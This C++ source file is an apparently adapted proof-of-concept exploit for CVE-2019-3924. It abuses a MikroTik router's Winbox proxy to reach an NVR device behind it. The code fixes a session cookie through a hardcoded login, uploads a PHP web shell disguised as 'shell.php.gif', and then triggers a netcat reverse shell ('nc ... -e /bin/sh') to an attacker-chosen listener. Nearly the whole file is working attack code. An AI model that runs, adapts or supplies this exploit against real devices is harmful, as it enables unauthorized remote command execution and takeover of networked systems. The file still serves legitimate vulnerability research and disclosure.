/*
    Copyright 2018-2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2019-3924 PoC NUUO Edition v1.0";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_proxy_ip, std::string& p_proxy_port,
                          std::string& p_target_ip, std::string& p_target_port,
                          std::string& p_listen_ip, std::string& p_listen_port,
                          bool& p_detect_only)
    {
        boost::program_options::options_description description("options");
        description.add_options()
            ("help,h", "A list of command line options")
            ("proxy_port", boost::program_options::value<std::string>(), "The MikroTik Winbox port to connect to")
            ("proxy_ip", boost::program_options::value<std::string>(), "The MikroTik router to connect to")
            ("target_port", boost::program_options::value<std::string>(), "The NVRMini port to connect to")
            ("target_ip", boost::program_options::value<std::string>(), "The NVRMini IP to connect to")
            ("listening_ip", boost::program_options::value<std::string>(), "The IP listening for the reverse shell")
            ("listening_port", boost::program_options::value<std::string>(), "The port listening for the reverse shell")
            ("detect_only,d", boost::program_options::bool_switch()->default_value(false), "Exit after detection logic");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("proxy_ip") && argv_map.count("proxy_port") &&
            argv_map.count("target_ip") && argv_map.count("target_port") &&
            argv_map.count("listening_ip") && argv_map.count("listening_port"))
        {
            p_proxy_ip.assign(argv_map["proxy_ip"].as<std::string>());
            p_proxy_port.assign(argv_map["proxy_port"].as<std::string>());
            p_target_ip.assign(argv_map["target_ip"].as<std::string>());
            p_target_port.assign(argv_map["target_port"].as<std::string>());
            p_listen_ip.assign(argv_map["listening_ip"].as<std::string>());
            p_listen_port.assign(argv_map["listening_port"].as<std::string>());
            p_detect_only = argv_map["detect_only"].as<bool>();
            return true;
        }
        else
        {
            std::cout << description << std::endl;
        }

        return false;
    }


    bool upload_custom_shell(Winbox_Session& session, boost::uint32_t p_converted_address, boost::uint32_t p_converted_port, std::string session_cookie)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);

        // -----WebKitFormBoundary{some_string} is just a way chrome and safari set default separator
        // multipart/form-data is a default data-type when uploading a file
        std::string payload =
            "------WebKitFormBoundary123\r\n"
            "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"shell.php.gif\"\r\n"
            "Content-Type: image/gif\r\n\r\n"
            "GIF89a;\n<?php system($_GET['cmd']); ?>\r\n" // payload
            "------WebKitFormBoundary123\r\n"
            "Content-Disposition: form-data; name=\"submit\"\r\n\r\n" // here starts upload file button
            "Upload File\r\n"
            "------WebKitFormBoundary123--\r\n"; // double hyphen indicates the end

        // Building the HTTP headers
        std::string request =
            "POST /upload.php HTTP/1.1\r\n"
            "Host: 192.168.99.100\r\n"
            "Cookie: PHPSESSID=" + session_cookie + "\r\n"
            "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123\r\n"
            "Content-Length: " + std::to_string(payload.length()) + "\r\n\r\n" +
            payload;

        msg.add_string(7, request);
        msg.add_string(8, "Success"); // Check if the page returns the "Success" message
        msg.add_u32(3, p_converted_address); // target ip
        msg.add_u32(4, p_converted_port); // target port

        session.send(msg);
        msg.reset();

        if (!session.receive(msg)) return false;
        return msg.get_boolean(0xd);
    }

    bool execute_custom_shell(Winbox_Session& session, boost::uint32_t p_converted_address, boost::uint32_t p_converted_port, std::string p_reverse_ip, std::string p_reverse_port)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);

        // Proxy the trigger command. URL encode spaces as %20
        std::string request =
            "GET /shell.php.gif?cmd=nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/sh HTTP/1.1\r\n"
            "Host: 192.168.99.100\r\n"
            "Connection: close\r\n\r\n";

        msg.add_string(7, request);
        msg.add_string(8, "GIF89a"); // The page will output our magic bytes when executed
        msg.add_u32(3, p_converted_address);
        msg.add_u32(4, p_converted_port);

        session.send(msg);
        msg.reset();

        if (!session.receive(msg)) return false;
        return msg.get_boolean(0xd); // indicates whether the response contains our gif
    }

    bool force_login_session(Winbox_Session& session, boost::uint32_t p_converted_address, boost::uint16_t p_converted_port, std::string forced_cookie)
    {
        WinboxMessage msg;
        msg.set_to(104); // proxy service
        msg.set_command(1); // command to initiate a connection
        msg.set_request_id(1);
        msg.set_reply_expected(true); // return reply

        std::string post_data = "username=test&password=1q2w3e4r5t";
        std::string request =
            "POST /login.php HTTP/1.1\r\n"
            "Host: 192.168.99.100\r\n"
            "Cookie: PHPSESSID=" + forced_cookie + "\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: " + std::to_string(post_data.length()) + "\r\n"
            "Connection: close\r\n\r\n" +
            post_data;

        msg.add_string(7, request);
        msg.add_string(8, ""); // Empty string forces the router to return True as long as the server replies
        msg.add_u32(3, p_converted_address);
        msg.add_u32(4, p_converted_port);

        session.send(msg);
        msg.reset();

        if (!session.receive(msg)) return false;
        return true;
    }
}

int main(int p_argc, const char** p_argv)
{
    bool detect_only = false;
    std::string proxy_ip;
    std::string proxy_port;
    std::string target_ip;
    std::string target_port;
    std::string listening_ip;
    std::string listening_port;
    if (!parseCommandLine(p_argc, p_argv, proxy_ip, proxy_port, target_ip,
         target_port, listening_ip, listening_port, detect_only))
    {
        return EXIT_FAILURE;
    }

    if (detect_only)
    {
        std::cout << "[!] Running in detection mode" << std::endl;
    }
    else
    {
        std::cout << "[!] Running in exploitation mode" << std::endl;
    }

    std::cout << "[+] Attempting to connect to a MikroTik router at " << proxy_ip << ":" << proxy_port << std::endl;
    Winbox_Session winboxSession(proxy_ip, proxy_port);
    if (!winboxSession.connect())
    {
        std::cerr << "Failed to connect to the MikroTik router." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Connected!" << std::endl;

    boost::uint32_t converted_address = ntohl(inet_network(target_ip.c_str()));
    boost::uint16_t converted_port = std::stoi(target_port);

    std::string active_session = "mycookie228";
    std::cout << "[+] Authenticating and fixing session ID to: " << active_session << std::endl;

    // Pass our defined cookie
    if (!force_login_session(winboxSession, converted_address, converted_port, active_session)) {
        std::cerr << "[-] Login request failed." << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Success! Session ID: " << active_session << std::endl;

    // Upload using the session we just got
    std::cout << "[+] Uploading shell.php.gif..." << std::endl;
    if (!upload_custom_shell(winboxSession, converted_address, converted_port, active_session)) {
        std::cerr << "[-] Upload failed." << std::endl;
        return EXIT_FAILURE;
    }

    // Execute Shell Code
    std::cout << "[+] Triggering reverse shell to " << listening_ip << ":" << listening_port << std::endl;
    execute_custom_shell(winboxSession, converted_address, converted_port, listening_ip, listening_port);

    std::cout << "[+] Done!" << std::endl;

    return EXIT_SUCCESS;
}

